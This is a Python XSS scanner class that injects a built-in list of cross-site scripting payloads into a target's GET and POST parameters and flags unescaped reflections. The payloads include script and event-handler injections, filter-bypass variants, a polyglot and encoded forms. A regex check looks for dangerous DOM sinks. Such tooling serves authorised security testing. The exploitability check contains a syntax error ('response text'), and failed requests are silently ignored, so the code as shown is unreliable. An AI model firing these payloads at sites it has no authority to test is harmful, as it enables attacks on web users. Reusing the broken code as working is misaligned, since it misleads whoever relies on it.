"""Cross-Site Scripting (XSS) vulnerability testing"""

import re
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests
from html.parser import HTMLParser


class XSSTester:
    """Cross-Site Scripting vulnerability scanner"""

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.payloads = self._load_payloads()

    def _load_payloads(self) -> List[Dict[str, str]]:
        """Load XSS test payloads"""
        return [
            # Basic XSS
            {"payload": "<script>alert('XSS')</script>", "type": "reflected", "context": "html"},
            {"payload": "<img src=x onerror=alert('XSS')>", "type": "reflected", "context": "html"},
            {"payload": "<svg onload=alert('XSS')>", "type": "reflected", "context": "html"},
            
            # Event handlers
            {"payload": "' onmouseover='alert(1)", "type": "reflected", "context": "attribute"},
            {"payload": "\" onload=\"alert(1)", "type": "reflected", "context": "attribute"},
            
            # JavaScript context
            {"payload": "'-alert(1)-'", "type": "reflected", "context": "javascript"},
            {"payload": "\"-alert(1)-\"", "type": "reflected", "context": "javascript"},
            {"payload": "</script><script>alert(1)</script>", "type": "reflected", "context": "javascript"},
            
            # DOM-based
            {"payload": "#<img src=x onerror=alert(1)>", "type": "dom", "context": "html"},
            
            # Filter bypass
            {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "type": "reflected", "context": "html"},
            {"payload": "<ScRiPt>alert(1)</sCrIpT>", "type": "reflected", "context": "html"},
            {"payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", "type": "reflected", "context": "html"},
            
            # Polyglot
            {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>//", "type": "polyglot", "context": "any"},
            
            # HTML entities
            {"payload": "&lt;script&gt;alert(1)&lt;/script&gt;", "type": "reflected", "context": "html"},
            
            # URL encoding
            {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "type": "reflected", "context": "html"},
            
            # Double encoding
            {"payload": "%253Cscript%253Ealert(1)%253C/script%253E", "type": "reflected", "context": "html"},
        ]

    def test_url(self, url: str, method: str = "GET", data: Dict = None) -> Dict[str, Any]:
        """
        Test URL for XSS vulnerabilities
        
        Args:
            url: Target URL to test
            method: HTTP method (GET or POST)
            data: POST data dictionary (if method=POST)
            
        Returns:
            Dictionary with test results
        """
        vulnerabilities = []
        
        # Test URL parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if params:
            for param_name in params.keys():
                results = self._test_parameter(url, param_name, method, "GET")
                if results:
                    vulnerabilities.extend(results)
        
        # Test POST parameters if data provided
        if method == "POST" and data:
            for param_name in data.keys():
                results = self._test_parameter(url, param_name, method, "POST", data)
                if results:
                    vulnerabilities.extend(results)
        
        return {
            "url": url,
            "method": method,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "total_vulnerabilities": len(vulnerabilities),
        }

    def _test_parameter(
        self,
        url: str,
        param_name: str,
        method: str,
        param_type: str,
        post_data: Dict = None
    ) -> List[Dict[str, Any]]:
        """Test a specific parameter for XSS"""
        vulnerabilities = []
        
        for payload_info in self.payloads:
            payload = payload_info["payload"]
            
            try:
                if param_type == "GET":
                    test_url = self._inject_payload_get(url, param_name, payload)
                    response = requests.get(test_url, timeout=self.timeout)
                else:
                    test_data = post_data.copy() if post_data else {}
                    test_data[param_name] = payload
                    response = requests.post(url, data=test_data, timeout=self.timeout)
                
                # Check if payload is reflected
                if self._is_reflected(response.text, payload):
                    # Determine if actually exploitable
                    is_exploitable, context = self._is_exploitable(response.text, payload)
                    
                    if is_exploitable:
                        vulnerabilities.append({
                            "parameter": param_name,
                            "parameter_type": param_type,
                            "payload": payload,
                            "xss_type": payload_info["type"],
                            "context": context,
                            "severity": self._determine_severity(payload_info["type"], context),
                            "evidence": self._extract_evidence(response.text, payload),
                        })
                        
            except Exception as e:
                pass
        
        return vulnerabilities

    def _inject_payload_get(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into GET parameter"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        params[param_name] = [payload]
        
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        return new_url

    def _is_reflected(self, response_text: str, payload: str) -> bool:
        """Check if payload is reflected in response"""
        # Check for exact match
        if payload in response_text:
            return True
        
        # Check for URL encoded version
        import urllib.parse
        encoded_payload = urllib.parse.quote(payload)
        if encoded_payload in response_text:
            return True
        
        # Check for HTML encoded version
        import html
        html_encoded = html.escape(payload)
        if html_encoded in response_text:
            return True
        
        return False

    def _is_exploitable(self, response_text: str, payload: str) -> tuple:
        """
        Determine if reflected input is actually exploitable
        
        Returns:
            (is_exploitable: bool, context: str)
        """
        # Check if payload is properly escaped/encoded
        import html
        escaped_payload = html.escape(payload)
        
        # If payload is HTML escaped, it's likely not exploitable
        if escaped_payload in response_text and payload not in response text:
            return False, "escaped"
        
        # Check context where payload appears
        contexts = {
            "<script": "script_tag",
            "onerror=": "event_handler",
            "onload=": "event_handler",
            "href=": "attribute",
            "src=": "attribute",
        }
        
        for pattern, context in contexts.items():
            if pattern in payload.lower() and payload in response_text:
                return True, context
        
        # Default: if reflected without escaping, potentially exploitable
        if payload in response_text:
            return True, "html"
        
        return False, "none"

    def _determine_severity(self, xss_type: str, context: str) -> str:
        """Determine severity based on XSS type and context"""
        if xss_type == "stored":
            return "critical"
        elif xss_type == "reflected" and context in ["script_tag", "event_handler"]:
            return "high"
        elif xss_type == "dom":
            return "high"
        else:
            return "medium"

    def _extract_evidence(self, response_text: str, payload: str) -> str:
        """Extract evidence showing where payload appears"""
        # Find context around payload
        index = response_text.find(payload)
        if index == -1:
            return "Payload reflected but exact location unclear"
        
        start = max(0, index - 50)
        end = min(len(response_text), index + len(payload) + 50)
        
        return response_text[start:end]

    def test_dom_xss(self, url: str) -> Dict[str, Any]:
        """
        Test for DOM-based XSS vulnerabilities
        
        Args:
            url: Target URL to test
            
        Returns:
            Test results for DOM-based XSS
        """
        # DOM-based XSS often requires JavaScript execution
        # This is a simplified version that checks for dangerous sinks
        
        try:
            response = requests.get(url, timeout=self.timeout)
            
            dangerous_sinks = [
                r"innerHTML\s*=",
                r"outerHTML\s*=",
                r"document\.write\s*\(",
                r"document\.writeln\s*\(",
                r"eval\s*\(",
                r"setTimeout\s*\(",
                r"setInterval\s*\(",
                r"Function\s*\(",
                r"location\.href\s*=",
                r"location\.replace\s*\(",
            ]
            
            vulnerabilities = []
            
            for sink in dangerous_sinks:
                if re.search(sink, response.text, re.IGNORECASE):
                    vulnerabilities.append({
                        "type": "potential_dom_xss",
                        "dangerous_sink": sink,
                        "severity": "medium",
                        "note": "Requires manual verification with browser",
                    })
            
            return {
                "url": url,
                "potential_dom_xss": len(vulnerabilities) > 0,
                "sinks_found": vulnerabilities,
            }
            
        except Exception as e:
            return {"error": str(e)}
